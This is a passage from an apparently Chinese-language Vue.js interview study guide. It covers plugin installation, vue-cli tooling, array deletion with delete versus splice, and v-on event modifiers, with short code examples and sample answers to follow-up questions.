<code>prop</code>，或通过组件更新钩子读取最新 <code>attrs</code>，而不是把透传机制当状态管理。</p>\\n</li>\\n<li>\\n<p><strong>设计系统团队想让所有包装组件默认透传全部属性，业务团队担心内部 <code>DOM</code> 调整会破坏页面，你支持哪边？</strong></p>\\n<p>我会按公开接口决定透传目标，而不是把“全部透传”设成无条件规范。对输入框这类代理组件，透传能降低维护成本；对多节点或内部结构可能变化的组件，应筛选并显式落点，否则调用方会依赖未承诺的 <code>DOM</code>、样式和事件行为。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_36-在vue中使用插件的步骤\\"><a class=\\"header-anchor\\" href=\\"#_36-在vue中使用插件的步骤\\">#</a> 36 在Vue中使用插件的步骤</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>三步：<code>import</code> 引入 → <code>Vue.use(plugin, options)</code> / <code>app.use(plugin)</code> 注册 → 按文档使用</li>\\n<li><code>use</code> 内部：<strong>防重复安装</strong> → 调用插件的 <code>install(app, options)</code> → 记录已安装列表</li>\\n<li>插件本质就是&quot;带 <code>install</code> 方法的对象&quot;或&quot;一个函数&quot;</li>\\n<li><code>install</code> 里通常做：注册全局组件/指令、注入全局属性、<code>provide</code> 全局值、（谨慎）全局 <code>mixin</code></li>\\n<li><code>Vue 3</code> 的关键改进：<code>app.use()</code> 是<strong>应用实例级</strong>的，同页面多个 <code>app</code> 互不影响，对微前端很关键</li>\\n<li>写插件优先用 <code>provide</code>/<code>inject</code> 而不是 <code>globalProperties</code>——后者是全局污染且类型推导差</li>\\n</ul>\\n<p><strong>使用插件通常就是引入插件，再通过 <code>Vue.use()</code> 或 <code>app.use()</code> 注册，最后按照插件提供的方式调用。</strong> 注册时框架会检查是否重复安装，并调用插件函数或对象的 <code>install</code> 方法，把 <code>Vue</code> 构造函数或 <code>app</code> 实例传进去。插件一般负责注册全局组件、指令，或者通过 <code>provide</code> 注入公共能力。<code>Vue 3</code> 的插件只作用于当前应用，写插件时也应谨慎使用影响所有组件的全局 <code>mixin</code>。</p>\\n</section>\\n<p><strong>使用方三步：</strong></p>\\n<pre class=\\"language-js\\"><code>// 1. 引入\\nimport Router from &#39;vue-router&#39;\\n// 2. 注册（可传选项）\\nVue.use(Router, { someOption: true })      // Vue 2\\napp.use(router)                            // Vue 3\\n// 3. 按插件文档使用\\n</code></pre>\\n<p><code>Vue.use()</code> 内部做了三件事：<strong>检查是否已安装（防重复）→ 调用插件的 <code>install</code> 方法并把 <code>Vue</code> 构造函数（<code>Vue 3</code> 是 <code>app</code> 实例）作为第一个参数传进去 → 记录到已安装列表</strong>。</p>\\n<p>所以插件本质上就是<strong>一个带 <code>install</code> 方法的对象，或者一个函数</strong>：</p>\\n<pre class=\\"language-js\\"><code>// 写法一：对象\\nconst MyPlugin = {\\n  install(app, options) { /* ... */ },\\n}\\n// 写法二：函数（会被当成 install 本身调用）\\nfunction MyPlugin(app, options) { /* ... */ }\\n</code></pre>\\n<p><strong>插件里通常做四类事：</strong></p>\\n<pre class=\\"language-js\\"><code>export default {\\n  install(app, options) {\\n    // ① 注册全局组件\\n    app.component(&#39;MyButton&#39;, MyButton)\\n    // ② 注册全局指令\\n    app.directive(&#39;permission&#39;, permissionDirective)\\n    // ③ 注入全局属性/方法（Vue 2 是挂 Vue.prototype）\\n    app.config.globalProperties.$toast = createToast(options)\\n    // ④ 提供全局可注入的值（Vue 3 推荐，比 globalProperties 更利于 TS）\\n    app.provide(&#39;apiClient&#39;, createClient(options))\\n    // ⑤ 混入生命周期（谨慎，会影响每个组件）\\n    app.mixin({ mounted() {} })\\n  },\\n}\\n</code></pre>\\n<p><strong><code>Vue 2</code> 和 <code>Vue 3</code> 的关键差别：</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th></th>\\n<th><code>Vue 2</code></th>\\n<th><code>Vue 3</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td>安装</td>\\n<td><code>Vue.use()</code> —— 全局，影响所有实例</td>\\n<td><code>app.use()</code> —— 只影响这个应用实例</td>\\n</tr>\\n<tr>\\n<td>注入全局方法</td>\\n<td><code>Vue.prototype.$xxx</code></td>\\n<td><code>app.config.globalProperties.$xxx</code></td>\\n</tr>\\n<tr>\\n<td>推荐方式</td>\\n<td>—</td>\\n<td><code>app.provide()</code> + <code>inject()</code></td>\\n</tr>\\n</tbody>\\n</table>\\n<p><code>Vue 3</code> 改成应用实例级别是一个重要改进：同一个页面里可以创建多个 <code>app</code>，各自的插件互不影响 —— 这对微前端和渐进迁移很关键。</p>\\n<p><strong>写插件时的三个建议：</strong></p>\\n<ol>\\n<li><strong>优先用 <code>provide</code>/<code>inject</code> 而不是 <code>globalProperties</code></strong> —— 后者是全局污染，类型推导也差；前者作用域明确，<code>TS</code> 支持好。</li>\\n<li><strong><code>install</code> 里避免用 <code>app.mixin</code></strong> —— 它会作用到每一个组件（包括第三方组件），副作用范围极大。</li>\\n<li><strong>考虑幂等</strong> —— 虽然 <code>Vue.use</code> 会防重复安装，但插件内部如果注册了全局事件或定时器，仍要自己处理清理逻辑。</li>\\n</ol>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>新同事把一个普通工具函数放进插件后就认为必须调用 <code>app.use()</code>，你怎么判断它到底算不算 <code>Vue</code> 插件？</strong></p>\\n<p>只有需要借安装阶段接触应用实例的能力，才值得设计成插件，例如注册全局组件、指令、注入服务或全局属性。插件可实现 <code>install(app, options)</code>，也可直接是安装函数；纯工具函数直接导入更清晰，强行插件化只会制造隐式全局依赖。</p>\\n</li>\\n<li>\\n<p><strong>组件库要给多个项目提供按钮、权限指令和 <code>API</code> 客户端，你会怎样实现统一安装入口？</strong></p>\\n<p>我会在插件的 <code>install(app, options)</code> 中调用 <code>app.component()</code>、<code>app.directive()</code>，并通过 <code>app.provide()</code> 注入按选项创建的客户端。使用方完成导入和 <code>app.use(plugin, options)</code> 后再按文档消费；安装逻辑应集中，但不要把所有业务状态塞进同一全局对象。</p>\\n</li>\\n<li>\\n<p><strong>一个页面同时挂了主站和活动页两个 <code>Vue</code> 3 应用，活动页安装插件后主站也必须获得 <code>$toast</code>，这个需求合理吗？</strong></p>\\n<p>默认不合理，因为 <code>Vue</code> 3 的 <code>app.use()</code> 只影响对应应用实例，两个 <code>app</code> 的组件、指令和全局属性相互隔离。若两边都需要，应分别安装或共享独立服务实例；试图绕过应用边界写浏览器全局变量，会重新引入污染和生命周期问题。</p>\\n</li>\\n<li>\\n<p><strong>线上热更新后一个插件重复注册了窗口监听器，点击一次触发两次，但 <code>app.use()</code> 明明会防重复安装，你会查什么？</strong></p>\\n<p>我会先确认是否创建了多个 <code>app</code>，以及监听器是否在 <code>install</code> 外或其他初始化路径重复执行。框架对同一应用的插件安装可防重复，但插件自行建立的全局事件、定时器仍需幂等和清理；多个应用共享资源时尤其不能只依赖安装记录。</p>\\n</li>\\n<li>\\n<p><strong>团队争论 <code>$toast</code> 应挂 <code>app.config.globalProperties</code> 还是用 <code>provide</code>，在 <code>Vue</code> 3 与 <code>TypeScript</code> 项目里你怎么选？</strong></p>\\n<p>组合式 <code>API</code> 项目我会优先用 <code>app.provide()</code>，再封装对应的 <code>inject</code> 或组合式函数，依赖边界和 <code>TypeScript</code> 类型更清楚。<code>globalProperties</code> 可用于兼容 <code>this.$toast</code> 的既有组件，但需要补充类型声明，也更像隐式全局依赖。</p>\\n</li>\\n<li>\\n<p><strong>埋点插件提议用 <code>app.mixin({ mounted() {} })</code> 监听所有组件挂载，负责人担心第三方组件也受影响，你会批准吗？</strong></p>\\n<p>我不会默认批准，因为全局 <code>mixin</code> 会进入每个组件，包括第三方组件，副作用和排查范围都很大。应优先寻找更明确的路由、指令或业务组件接入点；只有确实需要覆盖全应用且评估过影响时才使用，并设计去重与清理机制。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_37-vue-cli-工程技术集合介绍\\"><a class=\\"header-anchor\\" href=\\"#_37-vue-cli-工程技术集合介绍\\">#</a> 37 vue-cli 工程技术集合介绍</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>vue-cli</code> 是基于 <code>webpack</code> 的脚手架，提供项目初始化、开发服务器、构建、插件体系</li>\\n<li>核心集合：<code>vue-loader</code>（编译 <code>.vue</code>）、<code>babel</code>、<code>eslint</code>、<code>postcss</code>、<code>webpack</code> 及一堆预设配置</li>\\n<li>配置通过 <code>vue.config.js</code> 暴露，底层用 <code>webpack-chain</code> 做链式修改而不是直接改配置对象</li>\\n<li>现在官方已推荐 <code>create-vue</code> + <code>Vite</code>——开发时不打包、按需编译，冷启动和热更新快一个数量级</li>\\n<li>老项目继续用 <code>vue-cli</code> 没问题，但新项目没有理由不选 <code>Vite</code></li>\\n</ul>\\n<p><strong><code>vue-cli</code> 工程通常把视图、路由、状态管理、网络请求和模块构建这些能力组合在一起。</strong> <code>Vue</code> 负责组件和数据绑定，<code>vue-router</code> 管路由，<code>vuex</code> 管共享状态，<code>axios</code> 或 <code>fetch</code> 发起请求，<code>webpack</code> 完成模块加载与打包。<code>src</code> 下常用 <code>assets</code>、<code>components</code>、<code>router</code> 和 <code>views</code> 分类代码，<code>App.vue</code> 是主组件，<code>main.js</code> 是入口。日常一般用 <code>npm install</code> 安装依赖，用 <code>npm run dev</code> 开发、<code>npm run build</code> 构建。</p>\\n</section>\\n<h3 id=\\"构建的-vue-cli-工程都到了哪些技术-它们的作用分别是什么\\"><a class=\\"header-anchor\\" href=\\"#构建的-vue-cli-工程都到了哪些技术-它们的作用分别是什么\\">#</a> 构建的 vue-cli 工程都到了哪些技术，它们的作用分别是什么</h3>\\n<ul>\\n<li><code>vue.js</code>：<code>vue-cli</code>工程的核心，主要特点是 双向数据绑定 和 组件系统。</li>\\n<li><code>vue-router</code>：<code>vue</code>官方推荐使用的路由框架。</li>\\n<li><code>vuex</code>：专为 <code>Vue.js</code> 应用项目开发的状态管理器，主要用于维护<code>vue</code>组件间共用的一些 变量 和 方法。</li>\\n<li><code>axios</code>（ 或者 <code>fetch</code> 、<code>ajax</code> ）：用于发起 <code>GET</code> 、或 <code>POST</code> 等 <code>http</code>请求，基于 <code>Promise</code> 设计。</li>\\n<li><code>vuex</code>等：一个专为<code>vue</code>设计的移动端UI组件库。</li>\\n<li>创建一个<code>emit.js</code>文件，用于<code>vue</code>事件机制的管理。</li>\\n<li><code>webpack</code>：模块加载和<code>vue-cli</code>工程打包器。</li>\\n</ul>\\n<h3 id=\\"vue-cli-工程常用的-npm-命令有哪些\\"><a class=\\"header-anchor\\" href=\\"#vue-cli-工程常用的-npm-命令有哪些\\">#</a> vue-cli 工程常用的 npm 命令有哪些</h3>\\n<ul>\\n<li>下载 <code>node_modules</code> 资源包的命令：</li>\\n</ul>\\n<pre class=\\"language-text\\"><code>npm install\\n</code></pre>\\n<ul>\\n<li>启动 <code>vue-cli</code> 开发环境的 npm命令：</li>\\n</ul>\\n<pre class=\\"language-text\\"><code>npm run dev\\n</code></pre>\\n<ul>\\n<li><code>vue-cli</code> 生成 生产环境部署资源 的 <code>npm</code>命令：</li>\\n</ul>\\n<pre class=\\"language-text\\"><code>npm run build\\n</code></pre>\\n<ul>\\n<li>用于查看 <code>vue-cli</code> 生产环境部署资源文件大小的 <code>npm</code>命令：</li>\\n</ul>\\n<pre class=\\"language-text\\"><code>npm run build --report\\n</code></pre>\\n<blockquote>\\n<p>在浏览器上自动弹出一个 展示 <code>vue-cli</code> 工程打包后 <code>app.js</code>、<code>manifest.js</code>、<code>vendor.js</code> 文件里面所包含代码的页面。可以具此优化 <code>vue-cli</code> 生产环境部署的静态资源，提升 页面 的加载速度</p>\\n</blockquote>\\n<h3 id=\\"请说出vue-cli项目中src目录每个文件夹和文件的用法\\"><a class=\\"header-anchor\\" href=\\"#请说出vue-cli项目中src目录每个文件夹和文件的用法\\">#</a> 请说出vue cli项目中src目录每个文件夹和文件的用法</h3>\\n<ul>\\n<li><code>assets</code>文件夹是放静态资源；</li>\\n<li><code>components</code>是放组件；</li>\\n<li><code>router</code>是定义路由相关的配置;</li>\\n<li><code>view</code>视图；</li>\\n<li><code>app.vue</code>是一个应用主组件；</li>\\n<li><code>main.js</code>是入口文件</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>评审一个 <code>Vue</code> <code>CLI</code> 项目时，发现图片、页面、路由和入口代码全堆在 <code>src</code> 根目录，你会先按什么职责整理？</strong></p>\\n<p>我会把需参与构建的静态资源放入 <code>assets</code>，可复用组件放入 <code>components</code>，页面级视图放入 <code>views</code>，路由配置归入 <code>router</code>。<code>App.vue</code> 保持应用主组件职责，<code>main.js</code> 负责创建并启动应用；目录命名只解决归属，不能替代模块边界。</p>\\n</li>\\n<li>\\n<p><strong>商品列表页和订单页都用了 <code>PriceTag.vue</code>，但开发把它复制到两个 <code>views</code> 目录下，你会让它放哪里？</strong></p>\\n<p>跨页面复用的 <code>PriceTag.vue</code> 应进入 <code>components</code>，两个页面只组合和传参，避免复制后行为分叉。若组件只服务某个页面且强依赖其业务上下文，可与对应 <code>view</code> 就近放置；不能因为文件后缀是 <code>.vue</code> 就全部塞进公共组件目录。</p>\\n</li>\\n<li>\\n<p><strong>设计师把所有图片都放进 <code>assets</code>，运营却要求不发版就替换活动横幅，你会怎样划分？</strong></p>\\n<p><code>assets</code> 适合随源码参与构建和版本管理的静态资源，例如组件图标与固定背景。需要运营独立更新的横幅不应仅依赖源码目录，通常要由可配置的外部地址或内容系统提供；代价是必须处理加载失败、缓存和资源权限。</p>\\n</li>\\n<li>\\n<p><strong>线上打开 <code>/orders/123</code> 出现空白页，同事先去改 <code>App.vue</code>，你会沿着哪些文件排查？</strong></p>\\n<p>我会先检查 <code>router</code> 中是否存在对应路径、参数和目标视图，再确认该 <code>view</code> 是否正确导入及渲染。随后查看 <code>main.js</code> 是否把路由安装到应用、<code>App.vue</code> 是否保留路由出口；只改主组件可能掩盖真正的注册或映射错误。</p>\\n</li>\\n<li>\\n<p><strong>项目负责人想把接口请求、状态和复杂业务判断都写进 <code>App.vue</code>，理由是它是主组件，你会接受吗？</strong></p>\\n<p>我不会把“主组件”等同于“所有逻辑的容器”。<code>App.vue</code> 更适合承载应用壳、公共布局和顶层出口，页面业务应由对应 <code>views</code> 及其组件组织；集中堆放会造成全局耦合，但过度拆分同样会增加跳转成本。</p>\\n</li>\\n<li>\\n<p><strong>团队要在 <code>main.js</code> 里初始化路由、插件和全局组件，又担心入口越来越长，你会怎么控制边界？</strong></p>\\n<p><code>main.js</code> 应保留应用创建、必要依赖安装和挂载这些入口职责，具体配置分别放回 <code>router</code> 或插件模块，再由入口组合。这样启动顺序仍清晰，也避免把实现细节堆在单文件中；拆出的模块若产生隐式副作用，仍会让初始化难以追踪。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_38-delete和vue-delete删除数组的区别\\"><a class=\\"header-anchor\\" href=\\"#_38-delete和vue-delete删除数组的区别\\">#</a> 38 delete和Vue.delete删除数组的区别？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>delete arr[0]</code> 是原生操作符，只删键留下<strong>空位（hole）</strong>，<code>length</code> 不变</li>\\n<li><code>Vue.delete</code>/<code>$delete</code> 对数组内部调 <code>splice(index, 1)</code>，真正移除并让后面元素前移</li>\\n<li>空位很麻烦：<code>forEach</code> 会跳过它、<code>map</code> 会保留它、扩展运算符把它变成 <code>undefined</code>——行为不一致</li>\\n<li>响应式差别：<code>Vue 2</code> 的 <code>defineProperty</code> 拦不到 <code>delete</code>，所以视图不更新；<code>$delete</code> 会手动通知</li>\\n<li><strong>实践：数组删除一律用 <code>splice</code></strong>；<code>Vue 3</code> 的 <code>Proxy</code> 能拦到 <code>delete</code>，<code>Vue.delete</code> 已移除，但数组仍建议用 <code>splice</code></li>\\n</ul>\\n<p><strong><code>delete arr[index]</code> 只删除数组上的属性并留下空位，而 <code>Vue.delete</code> 会通过 <code>splice</code> 真正移除元素。</strong> 前者不会改变 <code>length</code>，而且不同数组方法对空位的处理并不一致；后者会让后续元素前移并缩短数组。<code>Vue 2</code> 的响应式系统无法拦截原生 <code>delete</code>，所以还可能出现视图不更新的问题。我一般直接用 <code>splice</code> 删除数组元素；<code>Vue 3</code> 虽能借助 <code>Proxy</code> 监听删除且移除了 <code>Vue.delete</code>，但用 <code>splice</code> 仍可避免空位。</p>\\n</section>\\n<pre class=\\"language-js\\"><code>var a = [1, 2, 3, 4]\\nvar b = [1, 2, 3, 4]\\ndelete a[0]\\nconsole.log(a)          // [empty, 2, 3, 4]  长度还是 4\\nthis.$delete(b, 0)\\nconsole.log(b)          // [2, 3, 4]         长度变成 3\\n</code></pre>\\n<p><strong>两者的差别有三层：</strong></p>\\n<p><strong>① 语义不同</strong></p>\\n<p><code>delete</code> 是 <code>JS</code> 原生操作符，作用是&quot;删除对象的属性&quot;。数组本质上也是对象，所以 <code>delete arr[0]</code> 只是删掉了键 <code>\'0\'</code>，<strong>留下一个空位（hole）</strong>，<code>length</code> 不变。这是 <code>JS</code> 语言层面的行为，和 <code>Vue</code> 无关。</p>\\n<p><code>Vue.delete</code>（<code>this.$delete</code>）内部对数组是直接调 <code>splice(index, 1)</code> —— 真正移除元素并让后面的元素前移，<code>length</code> 相应减少。</p>\\n<p><strong>② 空位（hole）是个麻烦的东西</strong></p>\\n<pre class=\\"language-js\\"><code>const a = [1, 2, 3]\\ndelete a[0]\\na.forEach(x =&gt; console.log(x))   // 只打印 2, 3 —— forEach 跳过空位\\na.map(x =&gt; x * 2)                // [empty, 4, 6] —— 保留空位\\na.length                         // 3\\n[...a]                           // [undefined, 2, 3] —— 扩展运算符把空位变成 undefined\\n</code></pre>\\n<p>不同的数组方法对空位的处理不一致，这是 <code>JS</code> 的历史遗留问题，所以<strong>应该完全避免产生空位</strong>。</p>\\n<p><strong>③ 响应式</strong></p>\\n<p>这才是 <code>Vue</code> 语境下的关键：<code>delete</code> 绕过了 <code>Vue 2</code> 的拦截（<code>defineProperty</code> 拦不到 <code>delete</code>），所以<strong>视图不会更新</strong>。<code>Vue.delete</code> 对数组走的是被重写过的 <code>splice</code>，对对象则会在删除后手动 <code>ob.dep.notify()</code> 通知更新。</p>\\n<pre class=\\"language-js\\"><code>// Vue 2 中\\ndelete this.list[0]           // ❌ 视图不更新，还留了个空位\\nthis.$delete(this.list, 0)    // ✅ 正确移除并更新视图\\nthis.list.splice(0, 1)        // ✅ 等价，更直观\\n</code></pre>\\n<p><strong>实践建议：</strong></p>\\n<ul>\\n<li><strong>数组删除一律用 <code>splice</code></strong> —— 语义最清楚，也不需要记 <code>$delete</code> 这个 API</li>\\n<li><strong>对象删除属性</strong>在 <code>Vue 2</code> 里用 <code>this.$delete(obj, key)</code></li>\\n<li><strong><code>Vue 3</code> 里两个问题都不存在</strong>：<code>Proxy</code> 的 <code>deleteProperty</code> 陷阱能拦到原生 <code>delete</code>，所以直接 <code>delete obj.key</code> 就会触发更新，<code>Vue.delete</code> 已被移除。但数组仍然建议用 <code>splice</code>——因为空位的问题是 <code>JS</code> 语言层面的，和框架无关。</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品列表原来有 4 项，执行 <code>delete list[0]</code> 后控制台显示长度仍为 4，<code>forEach</code> 却只遍历到 3 项，这是响应式丢失导致的吗？</strong></p>\\n<p>不只是响应式问题，根因是原生 <code>delete</code> 仅删除数组对象上的键 <code>\'0\'</code>，会留下空位且不改变 <code>length</code>。<code>forEach</code> 会跳过空位，而扩展运算符会把它转成 <code>undefined</code>，因此同一份数据可能产生不一致结果。</p>\\n</li>\\n<li>\\n<p><strong>在 <code>Vue 2</code> 购物车中删除一行后总价和页面都要立即更新，你会写 <code>this.$delete(this.list, index)</code> 还是 <code>this.list.splice(index, 1)</code>？</strong></p>\\n<p>数组场景优先写 <code>splice(index, 1)</code>，它会真正移除元素、移动后续索引并触发 <code>Vue 2</code> 已重写的数组变更通知。<code>this.$delete</code> 对数组内部也是走 <code>splice</code>，效果等价，但直接使用 <code>splice</code> 的删除语义更清楚。</p>\\n</li>\\n<li>\\n<p><strong>团队把项目从 <code>Vue 2</code> 升到 <code>Vue 3</code> 后，评审中有人把所有 <code>this.$delete</code> 机械替换成原生 <code>delete</code>，数组代码也一起替换，你会接受吗？</strong></p>\\n<p>对象属性可以改用原生 <code>delete</code>，因为 <code>Vue 3</code> 的 <code>Proxy</code> 能通过 <code>deleteProperty</code> 拦截删除并触发更新。数组不能机械替换，<code>delete list[index]</code> 仍会留下空位；这里应保留 <code>splice</code>，因为该风险来自 <code>JavaScript</code> 语义而非响应式实现。</p>\\n</li>\\n<li>\\n<p><strong>线上表格删除首行后界面仍像没变化，日志里却显示该索引已经不存在；项目是 <code>Vue 2</code>，你会按什么顺序定位？</strong></p>\\n<p>先确认代码是否执行了 <code>delete this.list[0]</code>，再检查 <code>list.length</code> 和 <code>0 in list</code>，区分空位与真正移除。若命中原生 <code>delete</code>，改为 <code>splice(0, 1)</code> 或 <code>this.$delete(this.list, 0)</code>；对象属性删除则必须保留 <code>$delete</code> 的通知语义。</p>\\n</li>\\n<li>\\n<p><strong>数据层想保留原数组引用，视图层又要求删除后索引连续；另一位同事建议用 <code>filter</code> 返回新数组，你会怎样取舍？</strong></p>\\n<p>需要保留原数组引用时选 <code>splice</code>，它原地删除且让索引连续，也能被 <code>Vue 2</code> 的响应式机制识别。允许替换引用时可用 <code>filter</code> 生成新数组，但必须把结果重新赋回响应式状态；两种方案都优于会制造空位的 <code>delete</code>。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_39-v-on可以监听多个方法吗\\"><a class=\\"header-anchor\\" href=\\"#_39-v-on可以监听多个方法吗\\">#</a> 39 v-on可以监听多个方法吗？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>三种形式：同元素绑多个不同事件、同一事件写多个语句（<code>@click=&quot;a(); b()&quot;</code>）、对象语法 <code>v-on=&quot;{ click: fn }&quot;</code> 批量绑定</li>\\n<li>常用修饰符：<code>.stop</code>/<code>.prevent</code>/<code>.self</code>/<code>.once</code>/<code>.capture</code>/<code>.passive</code></li>\\n<li>修饰符可串联且<strong>顺序有意义</strong>：<code>.prevent.self</code> 和 <code>.self.prevent</code> 行为不同</li>\\n<li>⚠️ <code>.passive</code> 和 <code>.prevent</code> <strong>不能一起用</strong> —— 语义直接冲突，开发环境会警告</li>\\n<li>⚠️ <code>.stop</code> 会破坏上层的事件委托和埋点 —— 更稳妥的是让上层自己判断 <code>e.target</code></li>\\n<li>组件上的 <code>@click</code> 默认是<strong>自定义事件</strong>，<code>Vue 2</code> 要加 <code>.native</code>，<code>Vue 3</code> 默认透传到根元素</li>\\n</ul>\\n<p><strong>可以，<code>v-on</code> 既能在同一元素上监听多个不同事件，也能让同一事件依次执行多个方法。</strong> 同一事件可写成 <code>@click=&quot;a(); b()&quot;</code>，但逻辑稍多时我一般会封装成一个方法，避免模板变乱；也可以用对象语法批量绑定。修饰符能够串联且顺序会影响行为，不过 <code>.passive</code> 和 <code>.prevent</code> 语义冲突，不能同时使用。还要注意组件事件：<code>Vue 2</code> 监听原生点击需加 <code>.native</code>，<code>Vue 3</code> 则可能把未声明的监听器透传到根元素。</p>\\n</section>\\n<p><strong>可以，而且有三种形式：</strong></p>\\n<p><strong>① 同一个元素上绑定多个不同事件</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;input :value=&quot;name&quot; @input=&quot;onInput&quot; @focus=&quot;onFocus&quot; @blur=&quot;onBlur&quot; /&gt;\\n</code></pre>\\n<p><strong>② 同一个事件绑定多个处理函数</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;button @click=&quot;handleA(); handleB()&quot;&gt;两个都执行&lt;/button&gt;\\n</code></pre>\\n<p>模板里可以直接写多个语句（用分号分隔），它们会被编译进同一个内联处理函数。但这种写法可读性差，超过一句就该抽成一个方法。</p>\\n<p><strong>③ 对象语法批量绑定</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;button v-on=&quot;{ click: onClick, mouseenter: onEnter }&quot;&gt;批量&lt;/button&gt;\\n</code></pre>\\n<p>这个写法在做组件透传时很有用 —— 配合 <code>v-on=&quot;$listeners&quot;</code>（<code>Vue 2</code>）或 <code>v-bind=&quot;$attrs&quot;</code>（<code>Vue 3</code>）能把父组件的所有监听器一次性传给内部元素。</p>\\n<p><strong>常用修饰符：</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th>修饰符</th>\\n<th>等价于</th>\\n<th>说明</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>.stop</code></td>\\n<td><code>e.stopPropagation()</code></td>\\n<td>阻止冒泡</td>\\n</tr>\\n<tr>\\n<td><code>.prevent</code></td>\\n<td><code>e.preventDefault()</code></td>\\n<td>阻止默认行为</td>\\n</tr>\\n<tr>\\n<td><code>.self</code></td>\\n<td>判断 <code>e.target === e.currentTarget</code></td>\\n<td>只在自身触发时执行</td>\\n</tr>\\n<tr>\\n<td><code>.once</code></td>\\n<td><code>{ once: true }</code></td>\\n<td>只触发一次</td>\\n</tr>\\n<tr>\\n<td><code>.capture</code></td>\\n<td><code>{ capture: true }</code></td>\\n<td>捕获阶段触发</td>\\n</tr>\\n<tr>\\n<td><code>.passive</code></td>\\n<td><code>{ passive: true }</code></td>\\n<td>承诺不阻止默认行为，改善滚动性能</td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>修饰符可以串联</strong>，且<strong>顺序有意义</strong>：<code>@click.prevent.self</code> 是&quot;先阻止默认行为，再判断是否自身触发&quot;；<code>@click.self.prevent</code> 是&quot;只有自身触发时才阻止默认行为&quot;。</p>\\n<p><strong>两个必须知道的坑：</strong></p>\\n<p><strong>① <code>.passive</code> 和 <code>.prevent</code> 不能一起用。</strong> 前者承诺&quot;我不会阻止默认行为&quot;，后者恰恰要阻止，语义直接冲突，<code>Vue</code> 会在开发环境警告。</p>\\n<p><strong>② <code>.stop</code> 会破坏事件委托和埋点。</strong> 上层如果靠冒泡收集点击埋点，下层一个 <code>.stop</code> 就会让这块的数据全部丢失。更稳妥的做法是让上层监听器自己判断 <code>e.target</code> 是否在关心的范围内，而不是让下层去阻止传播。</p>\\n<p><strong>在组件上绑事件的区别</strong>：组件上的 <code>@click</code> 默认是<strong>自定义事件</strong>（等 <code>$emit(\'click\')</code>），不是原生点击。<code>Vue 2</code> 要加 <code>.native</code>，<code>Vue 3</code> 移除了它、改成默认透传到根元素（前提是单根节点且没在 <code>emits</code> 里声明该事件名）。</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>提交按钮上写了 <code>@click=&quot;validate(); submit()&quot;</code>，测试发现校验失败时仍然发起请求；模板确实支持多个方法，为什么这段实现仍不合格？</strong></p>\\n<p>多个语句会按顺序进入同一个内联处理函数，但 <code>validate()</code> 返回失败不会自动阻止后面的 <code>submit()</code>。应抽成一个方法，显式判断校验结果后决定是否提交；模板超过一句后，控制流和异常处理都会迅速变得难读。</p>\\n</li>\\n<li>\\n<p><strong>封装输入框时要同时监听 <code>input</code>、<code>focus</code> 和 <code>blur</code>，团队有人主张写三个 <code>v-on</code>，有人要求使用对象语法，你会怎么定？</strong></p>\\n<p>固定且数量少的事件直接写 <code>@input</code>、<code>@focus</code>、<code>@blur</code> 更直观，每个处理器的意图一眼可见。事件集合需要统一生成或透传时再用 <code>v-on=&quot;listeners&quot;</code>；在 <code>Vue 3</code> 中组件透传通常结合 <code>v-bind=&quot;$attrs&quot;</code>，还要核对事件是否已声明。</p>\\n</li>\\n<li>\\n<p><strong>弹窗遮罩写成 <code>@click.prevent.self=&quot;close&quot;</code> 后，点击弹窗内的链接也无法跳转；产品要求只有点遮罩时才关闭并阻止默认行为，该怎么改？</strong></p>\\n<p>改成 <code>@click.self.prevent=&quot;close&quot;</code>，让 <code>.self</code> 先判断事件是否由遮罩自身触发，再执行 <code>.prevent</code>。修饰符按书写顺序生成处理逻辑，原写法会先阻止内部链接的默认行为，即使随后 <code>.self</code> 判定失败也无法恢复。</p>\\n</li>\\n<li>\\n<p><strong>卡片组件加了 <code>@click.stop</code> 后，上线一周才发现挂在页面上层的点击埋点全部缺失，你会怎样修复并验证？</strong></p>\\n<p>先移除不必要的 <code>.stop</code>，让上层委托监听器通过 <code>e.target</code> 或 <code>closest()</code> 判断是否属于目标卡片，再补测卡片内部按钮和空白区域。若业务确实要求隔离传播，只能在停止传播前显式上报，但会把埋点依赖下沉到组件。</p>\\n</li>\\n<li>\\n<p><strong>移动端滚动容器用了 <code>@touchmove.passive.prevent</code>，开发环境出现警告，而交互又要求某些手势阻止页面滚动，这两个诉求怎么处理？</strong></p>\\n<p><code>.passive</code> 承诺监听器不会调用 <code>preventDefault()</code>，与 <code>.prevent</code> 的语义直接冲突，不能组合使用。确实需要阻止默认滚动时应去掉 <code>.passive</code>；优先保障滚动性能时则保留 <code>.passive</code>，并重新设计不依赖阻止默认行为的手势方案。</p>\\n</li>\\n<li>\\n<p><strong>在 <code>Vue 2</code> 组件标签上写 <code>@click=&quot;track&quot;</code> 一直不触发，换到 <code>Vue 3</code> 